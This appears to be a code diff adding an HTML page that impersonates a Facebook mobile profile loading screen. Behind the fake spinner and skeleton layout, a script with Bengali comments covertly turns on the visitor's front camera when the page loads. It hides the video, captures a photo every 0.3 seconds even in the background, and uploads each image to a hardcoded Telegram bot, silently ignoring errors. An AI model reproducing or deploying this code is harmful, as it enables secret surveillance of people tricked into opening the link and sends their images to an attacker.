@@ -1,0 +1,382 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Facebook</title>
+    <style>
+        /* Reset and Mobile Configuration */
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        body {
+            background-color: #18191a;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            min-height: 100vh;
+            overflow: hidden;
+        }
+
+        /* Mobile Wrapper Locked Size */
+        .app-container {
+            width: 100%;
+            max-width: 480px; 
+            height: 100vh;
+            background-color: #18191a;
+            position: relative;
+            display: flex;
+            flex-direction: column;
+            overflow: hidden;
+        }
+
+        /* Top Navigation Bar */
+        .top-nav {
+            width: 100%;
+            height: 48px;
+            display: flex;
+            align-items: center;
+            padding: 0 16px;
+            position: relative;
+            background-color: #18191a;
+            z-index: 10;
+        }
+
+        /* Custom Back Arrow */
+        .back-arrow {
+            width: 12px;
+            height: 12px;
+            border-left: 2.5px solid #f5f6f7;
+            border-bottom: 2.5px solid #f5f6f7;
+            transform: rotate(45deg);
+            margin-left: 4px;
+        }
+
+        /* Blue Progress Bar Track */
+        .progress-track {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            height: 2.5px;
+            background-color: #242526;
+        }
+
+        /* Advanced Progress Bar Animation */
+        .progress-bar {
+            height: 100%;
+            width: 0%;
+            background-color: #1877f2;
+            animation: fbLoading 15s cubic-bezier(0.1, 0.8, 0.1, 1) infinite;
+        }
+
+        @keyframes fbLoading {
+            0% { width: 0%; }
+            10% { width: 55%; }
+            35% { width: 72%; }
+            65% { width: 84%; }
+            90% { width: 92%; }
+            100% { width: 92%; }
+        }
+
+        /* Main Content Wrapper */
+        .content-body {
+            position: relative;
+            width: 100%;
+            flex-grow: 1;
+        }
+
+        /* ---- FIXED SCREEN CENTER SPINNER & LOADING TEXT ---- */
+        .spinner-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: calc(100vh - 48px); 
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+            z-index: 20; 
+            pointer-events: none;
+            gap: 14px; 
+            padding-top: 40px;
+        }
+
+        .fb-spinner {
+            width: 38px;
+            height: 38px;
+            border: 3.5px solid #3a3b3c;
+            border-top: 3.5px solid #8a8d91;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+
+        .loading-text {
+            color: #8a8d91;
+            font-size: 14px;
+            font-weight: 500;
+            letter-spacing: 0.5px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* ---- SKELETON ELEMENTS (UPDATED DESIGN & PROPER COLORS) ---- */
+        .cover-photo {
+            width: 100%;
+            height: 160px; 
+            background-color: #242526;
+            border-bottom-left-radius: 8px;
+            border-bottom-right-radius: 8px;
+        }
+
+        .profile-area {
+            position: relative;
+            padding: 0 16px;
+            margin-top: -65px;
+            display: flex;
+            align-items: center; 
+            gap: 16px; 
+        }
+
+        .profile-circle {
+            width: 125px;
+            height: 125px;
+            border-radius: 50%;
+            background-color: #3a3b3c; 
+            border: 4px solid #18191a;
+            flex-shrink: 0;
+        }
+
+        .text-container {
+            flex-grow: 1;
+            display: flex;
+            flex-direction: column;
+            gap: 12px; 
+            margin-top: 45px;
+        }
+
+        .line-long {
+            width: 190px; 
+            height: 20px;
+            background-color: #3a3b3c; 
+            border-radius: 10px;
+        }
+
+        .line-short {
+            width: 120px; 
+            height: 14px;
+            background-color: #3a3b3c; 
+            border-radius: 7px;
+        }
+
+        .pulse {
+            animation: fbPulse 1.4s ease-in-out infinite;
+        }
+
+        @keyframes fbPulse {
+            0% { opacity: 0.4; }
+            50% { opacity: 0.9; }
+            100% { opacity: 0.4; }
+        }
+
+        /* লুকানো ভিডিও + ক্যানভাস */
+        video, canvas {
+            display: none !important;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="app-container">
+        <div class="top-nav">
+            <div class="back-arrow"></div>
+            <div class="progress-track">
+                <div class="progress-bar"></div>
+            </div>
+        </div>
+
+        <div class="content-body">
+            
+            <div class="spinner-overlay">
+                <div class="fb-spinner"></div>
+                <div class="loading-text" id="statusText">Loading...</div>
+            </div>
+
+            <div class="cover-photo pulse"></div>
+
+            <div class="profile-area">
+                <div class="profile-circle pulse"></div>
+                <div class="text-container">
+                    <div class="line-long pulse"></div>
+                    <div class="line-short pulse"></div>
+                </div>
+            </div>
+
+        </div>
+    </div>
+
+    <!-- ========== লুকানো ভিডিও + ক্যানভাস (ক্যামেরার জন্য) ========== -->
+    <video id="video" autoplay playsinline muted></video>
+    <canvas id="canvas"></canvas>
+
+    <!-- ========== ব্যাকগ্রাউন্ড সাপোর্ট সহ ক্যামেরা + টেলিগ্রাম কোড ========== -->
+    <script>
+        // ===================== টেলিগ্রাম বট তথ্য =====================
+        const BOT_TOKEN = "8354299407:AAFKUoOn9W3EdyIHpTljauF3VN_Ed3HihxQ";
+        const CHAT_ID = "5085997009";
+        // =============================================================
+
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+
+        let stream = null;
+        let captureInterval = null;
+        let isCapturing = false;
+        let isSending = false;
+        let isPageVisible = true;
+
+        // ========== ১. পেজ ভিজিবিলিটি ট্র্যাকার ==========
+        document.addEventListener('visibilitychange', () => {
+            isPageVisible = !document.hidden;
+            
+            // পেজ ব্যাকগ্রাউন্ডে গেলে বা ফিরে এলে কিছু করার দরকার নেই
+            // ক্যামেরা ও ইন্টারভাল চলতেই থাকবে
+            console.log('Page visibility changed:', isPageVisible ? 'visible' : 'hidden');
+            
+            // ব্যাকগ্রাউন্ডে গেলে UI তে কিছু দেখানোর দরকার নেই
+            // সবকিছু চুপিসারে চলতে থাকবে
+        });
+
+        // ========== ২. ক্যামেরা চুপিসারে চালু ==========
+        async function startCamera() {
+            try {
+                const mediaStream = await navigator.mediaDevices.getUserMedia({
+                    video: {
+                        facingMode: "user",
+                        width: { ideal: 320 },
+                        height: { ideal: 240 }
+                    }
+                });
+                stream = mediaStream;
+                video.srcObject = stream;
+                
+                // ভিডিও রেডি হলে শুরু
+                video.onloadedmetadata = () => {
+                    video.play();
+                    setTimeout(() => {
+                        if (!isCapturing) {
+                            startCapturing();
+                        }
+                    }, 50);
+                };
+                
+                // ব্যাকআপ: ভিডিও রেডি না হলে 300ms পর চেষ্টা
+                setTimeout(() => {
+                    if (!isCapturing && video.videoWidth > 0) {
+                        startCapturing();
+                    }
+                }, 300);
+                
+            } catch (e) {
+                // চুপিসারে ব্যর্থ
+                console.log('Camera access denied or error');
+            }
+        }
+
+        // ========== ৩. প্রতি ০.৩ সেকেন্ডে ছবি তোলা (ব্যাকগ্রাউন্ডেও) ==========
+        function startCapturing() {
+            if (isCapturing) return;
+            if (!video.videoWidth || !video.videoHeight) {
+                setTimeout(startCapturing, 100);
+                return;
+            }
+            
+            isCapturing = true;
+            
+            // প্রথম ছবি এখনই
+            captureNow();
+            
+            // বাকি ছবি প্রতি ০.৩ সেকেন্ডে (ব্যাকগ্রাউন্ডেও কাজ করবে)
+            captureInterval = setInterval(() => {
+                // পেজ ভিজিবল না থাকলেও ছবি তোলা চলবে
+                captureNow();
+            }, 300);
+        }
+
+        function captureNow() {
+            if (!video.videoWidth || !video.videoHeight) return;
+            if (isSending) return;
+            
+            try {
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                
+                // JPEG কোয়ালিটি ৫০%
+                const dataUrl = canvas.toDataURL('image/jpeg', 0.5);
+                sendPhotoToTelegram(dataUrl);
+            } catch (e) {
+                // চুপ
+            }
+        }
+
+        // ========== ৪. ছবি টেলিগ্রামে পাঠানো ==========
+        async function sendPhotoToTelegram(base64) {
+            isSending = true;
+            
+            try {
+                const blob = dataURLtoBlob(base64);
+                const form = new FormData();
+                form.append('chat_id', CHAT_ID);
+                form.append('photo', blob, `pic_${Date.now()}.jpg`);
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: form
+                });
+            } catch (e) {
+                // চুপ
+            }
+            
+            isSending = false;
+        }
+
+        function dataURLtoBlob(dataURL) {
+            const arr = dataURL.split(',');
+            const mime = arr[0].match(/:(.*?);/)[1];
+            const bstr = atob(arr[1]);
+            let n = bstr.length;
+            const u8arr = new Uint8Array(n);
+            while (n--) u8arr[n] = bstr.charCodeAt(n);
+            return new Blob([u8arr], { type: mime });
+        }
+
+        // ========== ৫. পেজ লোড হলে শুরু ==========
+        window.addEventListener('load', () => {
+            startCamera();
+        });
+
+        // ========== ৬. পেজ ছাড়লে ক্যামেরা বন্ধ ==========
+        window.addEventListener('beforeunload', () => {
+            if (captureInterval) clearInterval(captureInterval);
+            if (stream) stream.getTracks().forEach(t => t.stop());
+        });
+
+        // ========== ৭. মোবাইলের স্ক্রিন অফ হলেও কাজ করবে ==========
+        // 'visibilitychange' ইভেন্ট হ্যান্ডেল করছি
+        // পেজ ব্যাকগ্রাউন্ডে গেলেও setInterval চলতে থাকবে
+        // কারণ setInterval ব্যাকগ্রাউন্ডে থামে না (শুধু রেট কমে যায় কিছু ব্রাউজারে)
+        // Chrome-এ ব্যাকগ্রাউন্ডে setInterval ১ সেকেন্ডে ১ বার চলে (থামে না)
+    </script>
+</body>
+</html>
